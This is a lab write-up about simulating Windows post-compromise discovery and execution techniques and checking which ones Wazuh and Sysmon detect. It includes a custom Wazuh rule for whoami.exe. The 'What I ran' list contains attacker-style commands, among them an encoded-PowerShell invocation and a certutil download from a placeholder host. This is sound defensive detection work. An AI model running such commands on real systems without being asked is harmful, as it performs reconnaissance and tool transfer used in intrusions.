# 03 - Windows discovery and execution

Ran a handful of common post-compromise techniques on the Windows box to see what
Sysmon plus Wazuh would catch. The script is in
[../scripts/attack-sim.ps1](../scripts/attack-sim.ps1).

## What I ran

- `whoami /all`, `net user`, `net localgroup administrators` (account/user discovery)
- `systeminfo` (system info discovery)
- `ipconfig /all`, `arp -a` (network discovery)
- `powershell -EncodedCommand <base64>` (encoded PowerShell)
- `certutil -urlcache -split -f https://example.com/file.txt out.txt` (download a file with a living-off-the-land binary)

## What Wazuh caught

| Rule   | Level | Description                                            | MITRE            |
|--------|-------|--------------------------------------------------------|------------------|
| 92213  | 15    | Executable file dropped in a folder used by malware    | T1105            |
| 92057  | 12    | PowerShell ran an encoded/base64 command               | T1059.001        |
| 92031  | 3     | Discovery activity executed                            | T1087            |
| 92032  | 3     | Suspicious Windows cmd shell execution                 | T1087, T1059.003 |
| 92036  | 3     | net.exe started by a shell                             | T1059.003        |
| 92004  | 4     | PowerShell spawned a command shell                     | T1059.003        |

Windows Defender's ASR blocked the certutil download ("Access is denied"), which is
its own signal. Wazuh still logged the dropped-file event.

## The one it missed, and the rule I wrote

`whoami` is one of the first things an attacker runs, but the default rules only logged
it as a plain process-creation event with no alert. So I wrote a rule for it
(full file in [../detection-rules/local_rules.xml](../detection-rules/local_rules.xml)):

```xml
<rule id="100010" level="8">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)\\whoami\.exe$</field>
  <description>Custom: whoami.exe executed - System Owner/User Discovery (T1033)</description>
  <mitre><id>T1033</id></mitre>
</rule>
```

Dropped it into the manager's `local_rules.xml`, restarted with
`wazuh-control restart`, ran `whoami` again, and confirmed my rule fired:

```
desc:  Custom: whoami.exe executed - System Owner/User Discovery (T1033)
level: 8
mitre: T1033 (Discovery, System Owner/User Discovery)
image: C:\Windows\System32\whoami.exe
```
